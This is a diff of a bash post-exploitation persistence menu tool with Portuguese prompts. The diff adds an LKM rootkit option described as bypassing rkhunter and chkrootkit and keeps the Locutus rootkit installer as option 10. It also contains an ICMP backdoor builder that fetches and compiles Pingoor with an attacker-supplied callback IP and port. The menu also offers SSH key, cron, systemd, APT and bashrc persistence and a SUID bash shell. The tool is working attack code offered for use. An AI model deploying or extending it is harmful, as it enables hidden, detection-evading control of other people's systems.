@@ -194,21 +194,25 @@ sshGen() {
     rainbow "SSH-KEY geradas para todos os usuários válidos com sucesso!! XDXD"
 }
 
-lkmRootkit() {
-	#chmod +x implant_rootkit.sh
-	#./implant_rootkit.sh
-	bash install_locutus.sh
+lkmRootkitmodified() {
+  chmod +x implant_rootkit.sh
+  ./implant_rootkit.sh
 }
 
 icmpBackdoor() {
-	rainbow "Digite o endereço IP que irá receber o ping: "
-	read LHOST
-	rainbow "Digite o número da porta que irá receber a conexão: "
-	read LPORT
-	git clone https://github.com/MrEmpy/Pingoor
-	cd Pingoor
-	make HOST=$LHOST PORT=$LPORT
-	rainbow "Backdoor compilado. Você pode encontra-lo em Pingoor/pingoor"
+  rainbow "Digite o endereço IP que irá receber o ping: "
+  read LHOST
+  rainbow "Digite o número da porta que irá receber a conexão: "
+  read LPORT
+  git clone https://github.com/MrEmpy/Pingoor
+  cd Pingoor
+  make HOST=$LHOST PORT=$LPORT
+  rainbow "Backdoor compilado. Você pode encontra-lo em Pingoor/pingoor"
+}
+
+lkmRootkit(){
+  chmod +x install_locutus.sh
+  ./install_locutus.sh
 }
 
 banner() {
@@ -241,11 +245,11 @@ menu() {
     cat << EOF 
   [01] Generate SSH keypair       [06] Bashrc Persistence      
   [02] APT Persistence            [07] Privileged user & SUID bash
-  [03] Crontab Persistence        [08] LKM Rootkit
+  [03] Crontab Persistence        [08] LKM Rootkit Modified, Bypassing rkhunter & chkrootkit
   [04] Systemd User level         [09] ICMP Backdoor
-  [05] Systemd Root Level         
+  [05] Systemd Root Level         [10] LKM Rootkit
 
-  	[*] Coming soon others features [*]
+    [*] Coming soon others features [*]
 
 EOF
 
@@ -268,9 +272,11 @@ EOF
     elif [ "$MENUINPUT" == "7" ] || [ "$MENUINPUT" == "07" ]; then
         userANDBashSUID
     elif [ "$MENUINPUT" == "8" ] || [ "$MENUINPUT" == "08" ]; then
-        lkmRootkit
+        lkmRootkitmodified
     elif [ "$MENUINPUT" == "9" ] || [ "$MENUINPUT" == "09" ]; then
         icmpBackdoor
+    elif [ "$MENUINPUT" == "10" ] || [ "$MENUINPUT" == "10" ]; then
+        lkmRootkit
     else 
         echo "Essa opção não existe"
     fi
